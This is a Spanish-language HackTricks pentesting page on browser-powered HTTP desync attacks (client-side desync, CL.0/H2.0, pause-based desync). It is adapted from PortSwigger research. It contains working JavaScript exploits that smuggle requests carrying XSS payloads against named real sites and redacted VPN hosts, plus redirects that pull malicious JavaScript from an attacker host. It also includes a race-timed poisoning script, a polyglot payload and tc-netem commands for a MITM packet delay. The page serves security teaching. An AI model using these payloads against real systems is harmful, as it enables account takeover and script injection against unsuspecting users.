# Smuggling de solicitudes HTTP del navegador

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Desincronizaci√≥n compatible con el navegador CL.0/H2.0

Esta vulnerabilidad ocurre cuando el encabezado **Content Length** (CL) es completamente **ignorado** por el **servidor backend**. Luego, el backend trata el **cuerpo** como el **inicio del m√©todo de la segunda solicitud**. Ignorar el CL es equivalente a tratarlo como si tuviera un valor de 0, por lo que se trata de una desincronizaci√≥n CL.0, una clase de ataque [conocida](https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf) pero menos explorada.

![](<../../.gitbook/assets/image (3) (1) (2).png>)

El ataque fue posible porque el servidor backend simplemente **no esperaba una solicitud POST**.

{% hint style="warning" %}
Tenga en cuenta que esta vulnerabilidad se **desencadena** mediante una solicitud **HTTP v√°lida** y **compatible con las especificaciones**. Esto significa que el **front-end no tiene posibilidad de protegerse** contra ella, e incluso podr√≠a ser desencadenada por un navegador.
{% endhint %}

La √∫nica **diferencia** entre **CL.0** y **H2.0** es que el segundo est√° utilizando **HTTP2** (que tiene un encabezado de longitud de contenido impl√≠cito) pero el **backend tampoco lo est√° usando**.

## Desincronizaci√≥n del lado del cliente

Los ataques de desincronizaci√≥n tradicionales **envenenan** la **conexi√≥n** entre un servidor **front-end y back-end**, por lo que son imposibles en sitios web que no utilizan una arquitectura front-end/back-end. A partir de ahora, estos son los desincronizaciones del lado del servidor. La mayor√≠a de las desincronizaciones del lado del servidor solo se pueden desencadenar mediante una solicitud malformada de un cliente HTTP personalizado.

La capacidad de un **navegador para causar una desincronizaci√≥n** permite una nueva clase completa de amenazas llamada **desincronizaci√≥n del lado del cliente** (CSD).\
Un ataque CSD comienza con la **v√≠ctima visitando el sitio web del atacante**, que luego hace que su navegador env√≠e **dos solicitudes de dominio cruzado al sitio web vulnerable**. La **primera** solicitud est√° dise√±ada para **desincronizar la conexi√≥n del navegador** y hacer que la **segunda solicitud desencadene** una respuesta da√±ina, t√≠picamente dando al atacante el control de la cuenta de la v√≠ctima.

### Detectar

Un vector CSD es una solicitud HTTP con **dos** propiedades **clave**.

En primer lugar, el **servidor debe ignorar el Content-Length (CL) de la solicitud**. Esto suele suceder porque la solicitud **desencaden√≥ un error del servidor**, o el servidor simplemente **no esperaba una solicitud POST** en el punto final elegido. Intente apuntar a **archivos est√°ticos** y **redirecciones a nivel de servidor**, y desencadenar errores a trav√©s de **URL demasiado largas**, y **semi-malformadas** como /%2e%2e.

En segundo lugar, la solicitud debe ser **desencadenable en un navegador web de dominio cruzado**. Los navegadores restringen severamente el control sobre las solicitudes de dominio cruzado, por lo que tiene un control limitado sobre los encabezados, y si su solicitud tiene un cuerpo, deber√° usar el m√©todo HTTP POST. En √∫ltima instancia, solo **controla** la **URL**, adem√°s de algunas cosas como el encabezado **Referer**, el **cuerpo** y la **√∫ltima parte del tipo de contenido**.

#### Pruebas de ignorar CL

La forma de probar esta configuraci√≥n incorrecta es **enviar 2 solicitudes y contrabandear una** en el **medio**. Si la conexi√≥n **contrabandeada afect√≥** la respuesta de la **segunda solicitud**, significa que es **vulnerable**:

![](<../../.gitbook/assets/image (1) (2) (2) (1).png>)

{% hint style="warning" %}
Tenga en cuenta que no puede probar esta vulnerabilidad simplemente enviando un **Content-Length m√°s grande** que el enviado y **buscando un tiempo de espera** porque algunos servidores **responden** incluso si no recibieron todo el cuerpo.
{% endhint %}

Es importante tener en cuenta si el sitio web objetivo admite HTTP/2. Los ataques CSD t√≠picamente explotan la reutilizaci√≥n de conexi√≥n HTTP/1.1 y los navegadores web **prefieren usar HTTP/2** siempre que sea posible, por lo que si el sitio web objetivo admite HTTP/2, es poco probable que sus ataques funcionen. Hay una **excepci√≥n**; algunos **proxies hacia adelante no admiten HTTP/2** por lo que puede explotar a cualquiera que los use. Esto incluye proxies corporativos, ciertas VPN intrusivas e incluso algunas herramientas de seguridad.

### Confirmar

En primer lugar, seleccione un sitio para lanzar el ataque. Este sitio debe ser **accedido a trav√©s de HTTPS** y ubicado en un **dominio diferente al objetivo**.

A continuaci√≥n, aseg√∫rese de que **no tenga un proxy configurado**, luego navegue hasta su sitio de ataque. Abra las **herramientas de desarrollador** y cambie a la **pesta√±a Network**. Para ayudar con la depuraci√≥n de posibles problemas m√°s adelante, recomiendo hacer los siguientes ajustes:

* Seleccione la casilla de verificaci√≥n **"Preservar registro"**.
* Haga clic con el bot√≥n derecho en los encabezados de columna y **habilite la columna "ID de conexi√≥n"**.

Cambie a la consola de desarrollador y ejecute JavaScript para replicar su secuencia de ataque usando fetch(). Esto puede parecer algo as√≠:
```javascript
fetch('https://example.com/', {
  method: 'POST',
     body: "GET /hopefully404 HTTP/1.1\r\nX: Y", // malicious prefix
     mode: 'no-cors', // ensure connection ID is visible
     credentials: 'include' // poison 'with-cookies' pool
}).then(() => {
     location = 'https://example.com/' // use the poisoned connection
})
```
He establecido el modo de recuperaci√≥n **'no-cors'** para asegurarme de que Chrome **muestre el ID de conexi√≥n** en la pesta√±a de Red. Tambi√©n he establecido **credentials: 'include'** ya que Chrome tiene [**dos grupos de conexiones separados**](https://www.chromium.org/developers/design-documents/network-stack/preconnect) - uno para solicitudes con cookies y otro para solicitudes sin ellas. Normalmente, querr√°s explotar **navegaciones**, y estas **utilizan el grupo 'con-cookies'**, por lo que vale la pena acostumbrarse a siempre envenenar ese grupo.

Cuando ejecutes esto, deber√≠as ver **dos solicitudes** en la pesta√±a de Red con el **mismo ID de conexi√≥n**, y la **segunda** deber√≠a provocar un **404**:

![](<../../.gitbook/assets/image (158) (2).png>)

Si esto funciona como se espera, ¬°enhorabuena! ¬°Has encontrado una desincronizaci√≥n del lado del cliente!

### Explotaci√≥n - Almacenamiento

Una opci√≥n es identificar la funcionalidad en el sitio objetivo que te permita **almacenar datos de texto**, y crear el prefijo de manera que las cookies, las cabeceras de autenticaci√≥n o la contrase√±a de tu v√≠ctima acaben siendo **almacenados en alg√∫n lugar donde puedas recuperarlos**. Este flujo de ataque funciona [casi de manera id√©ntica a la desincronizaci√≥n de solicitudes del lado del servidor](https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests), as√≠ que no me detendr√© en ello.

### Explotaci√≥n - **Encadenar y pivotar**

En circunstancias normales, muchas clases de **ataques del lado del servidor** solo pueden ser lanzados por un atacante con acceso directo al sitio objetivo, ya que **dependen de solicitudes HTTP que los navegadores se niegan a enviar**, como **manipular** las **cabeceras HTTP** - envenenamiento de cach√© web, la mayor√≠a de las desincronizaciones de solicitudes del lado del servidor, ataques de cabecera de host, SQLi basado en User-Agent, CSRF JSON Content-type y numerosos otros.

El camino m√°s sencillo hacia un ataque exitoso provino de dos t√©cnicas clave que normalmente se utilizan para desincronizaciones del lado del servidor: [**envenenamiento de recursos JavaScript mediante redirecciones de cabecera de host**](https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect), y el uso del [**m√©todo HEAD**](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling#non-blind-request-tunnelling-using-head) para unir una respuesta con HTML da√±ino. Ambas t√©cnicas necesitaban ser **adaptadas** para superar algunos desaf√≠os novedosos asociados con la operaci√≥n en el **navegador de la v√≠ctima**.

## Ejemplos de explotaci√≥n

### Ejemplo de HEAD apilado

* **Explotaci√≥n en color**

![](<../../.gitbook/assets/image (2) (3).png>)

* **Explotaci√≥n JS**
```javascript
fetch('https://www.capitalone.ca/assets', {
    method: 'POST',
    // use a cache-buster to delay the response
    body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
    credentials: 'include',
    mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
    location = 'https://www.capitalone.ca/'
})va
```
Explicaci√≥n:

* **Abuso de CL.0** en /assets (redirige a /assets/ y no comprueba el CL)
* **Smuggle** de una petici√≥n **HEAD** (porque las respuestas HEAD todav√≠a contienen una longitud de contenido)
* **Smuggle** de una petici√≥n **GET** cuyo **contenido** va a ser **reflejado** en la respuesta con el payload.
  * Debido a la **longitud de contenido de la petici√≥n HEAD**, la **respuesta** de esta petici√≥n ser√° el **cuerpo de la petici√≥n HEAD**
* Establecer el **modo cors**. Normalmente esto no se hace, pero en este caso la **respuesta** del servidor al **POST** **inicial** es una **redirecci√≥n** que si se **sigue** el **exploit no funcionar√°**. Por lo tanto, se utiliza el **modo cors** para **desencadenar** un **error** y **redirigir** a la v√≠ctima con el **`catch`**.

### **Redirecci√≥n de encabezado de host + envenenamiento de cach√© del lado del cliente**

* **Exploit de JS**
```javascript
fetch('https://redacted/', {
    method: 'POST',
    body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y",
    credentials: 'include'}
).catch(() => { location='https://redacted/+CSCOE+/win.js' })
```
* Una solicitud a `/+webvpn+/` con un **dominio diferente en el encabezado Host** es respondida con una **redirecci√≥n** a `/+webvpn+/index.html` a ese **dominio** dentro del encabezado Host.
* La ubicaci√≥n en la **segunda** solicitud se establece en `/+CSCOE+/win.js` para **envenenar** la **cach√©** de ese archivo `.js`.
  * Esta solicitud ser√° respondida con la redirecci√≥n de `/+webvpn+/` al dominio del atacante con la ruta `/+webvpn+/index.html`.
* La **cach√©** de **`win.js`** ser√° **envenenada** con una **redirecci√≥n** a la p√°gina del **atacante**, pero tambi√©n la **v√≠ctima** seguir√° la redirecci√≥n ya que fue asignada en la variable `location` y terminar√° en la p√°gina web del atacante.
* Luego, el atacante **redirigir√°** a la **v√≠ctima** a `https://redacted/+CSCOE+/logon.html`. Esta p√°gina importar√° `/+CSCOE+/win.js`. Cuya **cach√© es una redirecci√≥n** al servidor del **atacante**, por lo tanto, el atacante puede **responder con un JS malicioso**.

La **v√≠ctima** **acceder√°** a la p√°gina del **atacante** **dos veces**, la primera vez **espera un HTML** que redirige a la v√≠ctima de vuelta a `https://redacted/+CSCOE+/logon.html` y la segunda vez **espera c√≥digo javascript** (la carga √∫til). Se puede usar un pol√≠glota para servir ambas respuestas en solo una:
```
HTTP/1.1 200 OK
Content-Type: text/html

alert('oh dear')/*<script>location = 'https://redacted/+CSCOE+/logon.html'</script>*/
```
### Payload HEAD con TE chunked

Al buscar CSD tambi√©n se pueden probar URLs semi-malformadas como `/..%2f` o `/%2f`.

* **Exploit en color**

![](<../../.gitbook/assets/image (5) (2) (1).png>)

* **Exploit en JS**
```javascript
fetch('https://www.verisign.com/%2f', { 
    method: 'POST',
    body: `HEAD /assets/languagefiles/AZE.html HTTP/1.1\r\nHost: www.verisign.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n34d\r\nx`, 
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'
}}).catch(() => {
    let form = document.createElement('form')
    form.method = 'POST'
    form.action = 'https://www.verisign.com/robots.txt'
    form.enctype = 'text/plain'
    let input = document.createElement('input')
    input.name = '0\r\n\r\nGET /<svg/onload=alert(1)> HTTP/1.1\r\nHost: www.verisign.com\r\n\r\nGET /?aaaaaaaaaaaaaaa HTTP/1.1\r\nHost: www.verisign.com\r\n\r\n'
    input.value = ''
    form.appendChild(input)
    document.body.appendChild(form)
    form.submit()
}
```
* La p√°gina **`/%2f`** es accedida para **explotar** la vulnerabilidad **CL.0**.
* Se utiliza una solicitud **HEAD** para hacer un **smuggling** usando el encabezado **`Transfer-Encoding: chunked`**.
  * Este encabezado es necesario en este escenario porque de lo contrario el **servidor rechaza una solicitud HEAD con un cuerpo**.
* Luego, el usuario env√≠a un POST cuyo cuerpo contiene el **chunk final de la solicitud HEAD anterior** y una **nueva solicitud que se smuglea** con **contenido** (la carga √∫til de JS) que ser√° **reflejado** en la respuesta.
  * Por lo tanto, el navegador tratar√° la **respuesta a la solicitud HEAD** como la **respuesta a la solicitud POST** que tambi√©n **contiene** en el **cuerpo** de la respuesta que **refleja** la **entrada** del usuario en la segunda solicitud smugleada.

### Redirecci√≥n de encabezado de host + RC

* **JS Exploit**
```html
<script>
    function reset() {
        fetch('https://vpn.redacted/robots.txt', 
            {mode: 'no-cors', credentials: 'include'}
        ).then(() => {
            x.location = "https://vpn.redacted/dana-na/meeting/meeting_testjs.cgi?cb="+Date.now()
        })
        setTimeout(poison, 120) // worked on 140. went down to 110
    }

    function poison(){
        sendPoison()
        sendPoison()
        sendPoison()
        setTimeout(reset, 1000)
    }

    function sendPoison(){
        fetch('https://vpn.redacted/dana-na/css/ds_1234cb049586a32ce264fd67d524d7271e4affc0e377d7aede9db4be17f57fc1.css', 
            {
                method: 'POST',
                body: "GET /xdana-na/imgs/footerbg.gif HTTP/1.1\r\nHost: x.psres.net\r\nFoo: '+'a'.repeat(9826)+'\r\nConnection: keep-alive\r\n\r\n",
                mode: 'no-cors', 
                credentials: 'include'
            }
        )
    }

</script>
<a onclick="x = window.open('about:blank'); reset()">Start attack</a>
```
En este caso, de nuevo, hay una **redirecci√≥n de encabezado de host** que podr√≠a ser utilizada para **secuestrar** una importaci√≥n de **JS**. Sin embargo, esta vez la **redirecci√≥n no es cach√©able**, por lo que el **envenenamiento de cach√©** del lado del cliente no es una opci√≥n.

Por lo tanto, el ataque realizado har√° que la **v√≠ctima acceda a la p√°gina vulnerable** en una pesta√±a y luego, justo **antes** de que la p√°gina intente **cargar un archivo JS**, **envenenar** las **conexiones de contrabando de socket** (3 en este caso).\
Debido a que el **momento** tiene que ser extremadamente **preciso**, el ataque se realiza contra una **nueva pesta√±a en cada iteraci√≥n** hasta que funcione.

{% hint style="warning" %}
Tenga en cuenta que en este caso `/meeting_testjs.cgi` fue atacado porque **carga** un **Javascript** que responde con un **404**, por lo que no est√° en cach√©. En otros escenarios donde intenta atacar un **JS que est√° en cach√©** debe esperar a que **desaparezca de la cach√©** antes de lanzar un nuevo ataque.
{% endhint %}

Pasos resumidos:

* Abrir una nueva ventana.
* Emitir una solicitud inofensiva al objetivo para establecer una conexi√≥n fresca, haciendo que los tiempos sean m√°s consistentes.
* Navegar la ventana a la p√°gina de destino en /meeting\_testjs.cgi.
* 120ms despu√©s, crear tres conexiones envenenadas usando el gadget de redirecci√≥n.
* 5ms despu√©s, mientras se est√° renderizando /meeting\_testjs.cgi, la v√≠ctima intentar√° importar /appletRedirect.js y ser√° redirigida a x.psres.net, que sirve un JS malicioso.
* Si no, volver a intentar el ataque.

## Desincronizaci√≥n basada en pausas <a href="#pause" id="pause"></a>

La pausa tambi√©n puede crear nuevas vulnerabilidades de desincronizaci√≥n al **disparar implementaciones de tiempo de espera de solicitud equivocadas**.

Por lo tanto, un atacante podr√≠a enviar una solicitud con **encabezados que indiquen que hay un cuerpo**, y luego **esperar** a que el **front-end agote el tiempo de espera antes de enviar el cuerpo**. Si el front-end agota el tiempo de espera pero **deja la conexi√≥n abierta**, el **cuerpo** de esa solicitud ser√° **tratado como una nueva solicitud**.

### Ejemplo: **Varnish**

La cach√© de Varnish tiene una funci√≥n llamada `synth()`, que le permite emitir una **respuesta sin reenviar** la solicitud al back-end. Aqu√≠ hay una regla de ejemplo que se utiliza para bloquear el acceso a una carpeta:
```javascript
if (req.url ~ "^/admin") {
    return (synth(403, "Forbidden"));
}
```
Al procesar una solicitud parcial que coincide con una regla sint√©tica, Varnish **se agotar√°** si no recibe datos durante **15 segundos**. Cuando esto sucede, **deja la conexi√≥n abierta** para su reutilizaci√≥n aunque solo haya le√≠do la mitad de la solicitud del socket. Esto significa que si el **cliente sigue con la segunda mitad** de la solicitud HTTP, se interpretar√° como una **solicitud nueva**.

Para desencadenar una desincronizaci√≥n basada en pausas en un front-end vulnerable, comience enviando sus encabezados, prometiendo un cuerpo y luego simplemente espere. Eventualmente recibir√° una respuesta y cuando finalmente env√≠e su cuerpo de solicitud, se interpretar√° como una nueva solicitud:

![](<../../.gitbook/assets/image (4) (3) (1).png>)

{% hint style="warning" %}
Aparentemente esto fue parcheado el 25 de enero como [CVE-2022-23959](https://varnish-cache.org/security/VSV00008.html).
{% endhint %}

### Ejemplo: **Apache**

Al igual que Varnish, es vulnerable en **puntos finales donde el servidor genera la respuesta en s√≠** en lugar de permitir que la aplicaci√≥n maneje la solicitud. Una forma en que esto sucede es con redireccionamientos a nivel de servidor: `Redirect 301 / /en`

### Explotaci√≥n del lado del servidor <a href="#server" id="server"></a>

Si el servidor vulnerable (Apache o Varnish en este caso) est√° en el back-end, se necesita un **front-end** que **transmita la solicitud al servidor de back-end** (encabezados http en este caso) **sin almacenar en b√∫fer** todo el cuerpo de la solicitud.

![](<../../.gitbook/assets/image (3) (3).png>)

En este caso, el atacante **no recibir√° el tiempo de espera de respuesta hasta que haya enviado el cuerpo**. Pero si conoce el tiempo de espera, esto no deber√≠a ser un problema.

El Application Load Balancer (ALB) de Amazon **transmitir√° los datos de la conexi√≥n seg√∫n sea necesario**, pero si **recibe** la **respuesta** a la mitad de la solicitud (el tiempo de espera) **antes de** recibir el **cuerpo**, **no enviar√° el cuerpo**, por lo que aqu√≠ se debe explotar una **condici√≥n de carrera**:

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Hay una complicaci√≥n adicional cuando se trata de **explotar Apache detr√°s de ALB** - **ambos servidores** tienen un **tiempo de espera predeterminado de 60 segundos**. Esto deja una **ventana de tiempo extremadamente peque√±a** para enviar la segunda parte de la solicitud. El ataque de condici√≥n de carrera tuvo √©xito despu√©s de 66 horas.

### Explotaci√≥n MITM

Aparentemente, **no es posible detener una solicitud desde el navegador** para explotar una vulnerabilidad de pausa-desincronizaci√≥n. Sin embargo, siempre se puede **realizar un ataque MITM para pausar una solicitud** enviada por el navegador. Tenga en cuenta que este ataque **no depende de descifrar** ning√∫n tr√°fico.

El flujo de ataque es muy **similar a un ataque de desincronizaci√≥n del lado del cliente regular**. El usuario visita una p√°gina controlada por el atacante, que emite una serie de **solicitudes entre dominios** a la aplicaci√≥n objetivo. La **primera solicitud HTTP** est√° deliberadamente acolchada para ser tan **grande** que el sistema operativo **la divide en varios paquetes TCP**, lo que permite a un MITM activo **retrasar el paquete final**, desencadenando una desincronizaci√≥n basada en pausas. Debido al acolchado, el **atacante** puede **identificar** qu√© **paquete pausar** simplemente en funci√≥n del **tama√±o**.

Desde el lado del cliente, parece un desincronizaci√≥n del lado del cliente regular utilizando el gadget HEAD, aparte del acolchado de la solicitud:
```javascript
let form = document.createElement('form')
form.method = 'POST'
form.enctype = 'text/plain'
form.action = 'https://x.psres.net:6082/redirect?'+"h".repeat(600)+ Date.now()
let input = document.createElement('input')
input.name = "HEAD / HTTP/1.1\r\nHost: x\r\n\r\nGET /redirect?<script>alert(document.domain)</script> HTTP/1.1\r\nHost: x\r\nFoo: bar"+"\r\n\r\n".repeat(1700)+"x"
input.value = "x"
form.append(input)
document.body.appendChild(form)
form.submit()
```
En el sistema del atacante que realiza el MITM ciego, el retraso se implement√≥ utilizando tc-NetEm:
```bash
# Setup
tc qdisc add dev eth0 root handle 1: prio priomap

# Flag packets to 34.255.5.242 that are between 700 and 1300 bytes
tc filter add dev eth0 protocol ip parent 1:0 prio 1 basic \
match 'u32(u32 0x22ff05f2 0xffffffff at 16)' \
and 'cmp(u16 at 2 layer network gt 0x02bc)' \
and 'cmp(u16 at 2 layer network lt 0x0514)' \
flowid 1:3

# Delay flagged packets by 61 seconds
tc qdisc add dev eth0 parent 1:3 handle 10: netem delay 61s
```
## **Referencias**

* Toda la informaci√≥n de esta publicaci√≥n fue tomada de [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
